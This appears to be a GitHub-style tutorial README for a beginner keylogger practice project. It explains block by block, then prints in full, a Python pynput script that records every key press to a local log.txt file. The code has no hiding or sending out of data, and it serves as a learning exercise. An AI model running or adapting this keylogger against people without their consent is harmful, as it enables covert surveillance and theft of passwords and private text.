<h1>Keylogger Practice Project</h1>

<h2>Description</h2>
This script is a simple keylogger that captures every key press, and records them in a text file called "log.txt". It imports the necessary modules from the pynput library, which allows it to listen to keyboard inputs. The script defines a function on_press which is called every time a key is pressed. In the function, it first tries to get the character of the key pressed, if it fails it checks if the key pressed is a space, if it is a space it assigns current_key as a space otherwise it assigns current_key as " + str(key) + " ". Then it appends the current key to a global variable called log. It then opens the "log.txt" file, which is created if it does not exist, and writes the key presses to the file. The script starts the keylogger by initializing an empty log list, and creates a keyboard listener that calls the on_press function whenever a key is pressed. The listener is joined so that the script waits for key presses and continues to run until it is interrupted.
<br />


<h2>Environments Used </h2>

- <b>Windows 11</b>

<h2>Program Walkthough:</h2>

<b>This first block imports the necessary modules from the pynput library. The pynput library allows for control and monitoring of keyboard and mouse inputs.</b>

```python
import pynput
from pynput import keyboard
```
<b>This block defines the on_press function which will be called every time a key is pressed. The function takes in a key argument which is the key that was pressed. The function first tries to get the char attribute of the key which will give the character representation of the key. If this fails, it means that the key pressed is not a character, so it checks if it's a space and assigns the value " " to the current_key variable. If it's not a space it assigns the key name to the current_key variable.</b>

```python
# function to be called whenever a key is pressed
def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
```            
<b>This line appends the current key to a global variable named log. This variable stores all the keys pressed.</b>

```python
 # append the current key to a global variable storing the log
    log.append(current_key)
```

<b>This block writes the contents of the log variable to a file named "log.txt". It opens the file in write mode, and for each key stored in the log variable, it removes the single quotes from the key and checks if the key is a space or not. If it's a space, it writes a space to the file. If it's not a space, it writes the key to the file.</b>

```python
 # write the log to a file
    with open("log.txt", "w") as f:
        for key in log:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)
```

<b>This block starts the keylogger by initializing an empty log list, and creates a keyboard listener that calls the on_press function whenever a key is pressed. The listener is joined so that the script waits for key presses and continues to run until it is interrupted.</b>

```python
# start the keylogger
log = []
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```    

<b> The final result should look like this:</b>

```python
import pynput
from pynput import keyboard

# import necessary modules

# function to be called whenever a key is pressed
def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    # append the current key to a global variable storing the log
    log.append(current_key)
    # write the log to a file
    with open("log.txt", "w") as f:
        for key in log:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)

# start the keylogger
log = []
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
